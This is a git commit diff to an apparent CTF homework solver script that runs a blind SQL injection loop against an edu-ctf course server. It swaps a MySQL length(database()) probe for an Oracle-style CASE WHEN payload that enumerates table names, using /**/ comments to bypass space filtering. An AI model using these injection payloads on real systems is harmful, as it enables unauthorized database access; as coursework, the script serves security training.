11f064ead0e6090e9562126a10109ac65b37eb00
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-11 22:29:39 +0800

    Try solving with python script

--- Hw0x04/cathub/solve.py
+++ Hw0x04/cathub/solve.py
@@ -6,12 +6,15 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 url = 'https://edu-ctf.csie.org:10159/video.php?vid='
 
 for i in range(0, 100):
-    url2 = url + '1/**/and/**/length(database())=' + str(i)
+    url2 = url + '(case/**/when/**/(length(select/**/table_name/**/from/**/all_tables/**/FETCH/**/FIRST/**/1/**/ROWS/**/ONLY)==' + str(i) + ')/**/then/**/1/**/else/**/2/**/end)'
     print(url2)
+    input()
     result = requests.get(url2, verify=False)
+    print(result.text)
     if 'Error' not in result.text:
         print(result.text)
 
+print('end 1')
 input()
 for i in range(0, 255):
     print('---------------lognumber %d ----------'%(i))
